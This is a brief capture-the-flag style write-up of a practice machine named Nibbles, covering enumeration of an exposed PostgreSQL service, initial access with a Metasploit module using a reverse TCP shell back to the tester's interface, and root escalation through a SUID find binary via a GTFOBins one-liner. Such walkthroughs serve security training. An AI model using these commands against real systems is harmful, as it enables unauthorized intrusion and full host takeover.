# Nibbels

### Enumeration

```
5437/tcp open   postgresql   PostgreSQL DB 11.3 - 11.7
```

Credential is postgres:\[REDACTED] - Easy one :)

### Initial Access

```
msf6 exploit(linux/postgres/postgres_payload) > options 

Module options (exploit/linux/postgres/postgres_payload):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   DATABASE  template1        yes       The database to authenticate against
   PASSWORD  [REDACTED]       no        The password for the specified username. L
                                        eave blank for a random password.
   RHOSTS    192.168.210.47   yes       The target host(s), range CIDR identifier,
                                         or hosts file with syntax 'file:<path>'
   RPORT     5437             yes       The target port
   USERNAME  postgres         yes       The username to authenticate as
   VERBOSE   false            no        Enable verbose output


Payload options (linux/x64/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  tun0             yes       The listen address (an interface may be speci
                                     fied)
   LPORT  80               yes       The listen port


Exploit target:

   Id  Name
   --  ----
   1   Linux x86_64
```

### PrivEsc

```
postgres@nibbles:/tmp$ find / -perm -u=s -type f 2>/dev/null
...
/usr/bin/find
```

[https://gtfobins.github.io/gtfobins/find/](https://gtfobins.github.io/gtfobins/find/)

```
find . -exec /bin/sh -p \; -quit
```
